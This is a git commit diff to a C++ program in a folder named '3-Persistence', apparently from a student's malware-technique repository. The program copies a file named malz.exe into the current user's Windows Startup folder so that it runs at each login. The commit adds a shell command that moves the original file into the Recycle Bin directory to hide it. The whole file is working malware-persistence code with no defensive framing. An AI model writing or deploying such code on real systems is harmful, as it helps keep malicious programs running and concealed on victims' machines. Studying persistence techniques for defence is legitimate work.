4a1ec8f6fc9e7a107c4f5d67917bbf463f991637
Anıl Çelik <celik.anil@student.atilim.edu.tr>
2022-11-07 01:58:41 +0300

    Update addtostartup.cpp

--- 3-Persistence/addtostartup.cpp
+++ 3-Persistence/addtostartup.cpp
@@ -1,5 +1,5 @@
 // Just copies the binary to the Startup directory for persistence purposes.
-// Raw code, no encoding or encryption
+// Nothing fancy: Just some raw code, no encoding or encryption
 
 #include <iostream>
 #include <windows.h>
@@ -8,7 +8,7 @@
 #include <cstdlib>
 
 using namespace std;
-namespace fs = std::filesystem;
+namespace fs = filesystem;
 
 string username = getenv("USERNAME");
 
@@ -18,7 +18,10 @@ int main() {
     string targetFile = "C:\\Users\\" + username + "\\Downloads\\malz.exe";
     string targetDIR = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malz.exe";
 
-    fs::copy(targetFile, targetDIR); //copy malz.exe to Startup directory for persistence
+    fs::copy(targetFile, targetDIR);    //copy malz.exe to Startup directory for persistence
+    system(("cmd.exe /c move " + targetFile + " C:\\$Recycle.Bin").c_str());    //requires admin privs
+    
+    //remove(("C:\\Users\\" + username + "\\Downloads\\malz.exe").c_str());     //doesn't work somehow, will figure out later
 
     return 0;
 }
